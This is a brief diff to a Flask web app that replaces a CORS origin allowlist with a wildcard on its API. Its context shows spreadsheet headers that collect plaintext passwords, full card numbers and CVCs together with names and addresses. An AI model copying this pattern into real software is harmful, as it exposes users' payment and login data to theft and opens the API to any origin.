@@ -10,13 +10,7 @@ import datetime
 
 app = Flask(__name__)
 app.config.from_object(Config)
-CORS(app, origins=[
-    'http://localhost:3000',
-    'http://localhost:3001',
-    'http://localhost:5001',
-    'https://bridgehaven.vercel.app',
-    'https://*.vercel.app',
-], supports_credentials=True)
+CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=False)
 
 # CSV/Sheet column headers
 HEADERS = ['Timestamp', 'Full Name', 'Email', 'Password', 'Card Number', 'Name on Card', 'Expiry', 'CVC', 'Street Address', 'Apt/Suite', 'City', 'State', 'ZIP Code', 'Country', 'Amount', 'Type']
